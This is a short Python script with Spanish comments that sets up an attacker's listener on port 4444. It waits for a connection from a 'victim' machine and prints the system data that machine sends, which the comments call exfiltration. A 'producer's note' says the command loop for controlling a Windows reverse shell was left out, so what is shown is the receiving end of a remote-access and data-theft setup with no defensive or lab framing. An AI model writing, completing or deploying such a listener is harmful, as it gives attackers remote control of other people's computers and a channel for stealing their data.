import socket

IP = "0.0.0.0" # Escucha en todas las interfaces
PUERTO = 4444

def iniciar_servidor():
    servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    servidor.bind((IP, PUERTO))
    servidor.listen(1)
    print(f"[*] Consola encendida. Escuchando en el puerto {PUERTO}...")
    
    conexion, direccion = servidor.accept()
    print(f"[+] Conexión establecida desde la IP de la víctima: {direccion}")
    
    # Recibiendo la exfiltración de datos
    datos = conexion.recv(1024).decode('utf-8')
    print(f"[*] Datos del sistema recibidos:\n{datos}")
    
    # Nota del productor: Aquí iba tu bucle infinito (while True) 
    # para mandarle comandos a la Reverse Shell de Windows.
    
    conexion.close()
    servidor.close()

if __name__ == "__main__":
    iniciar_servidor()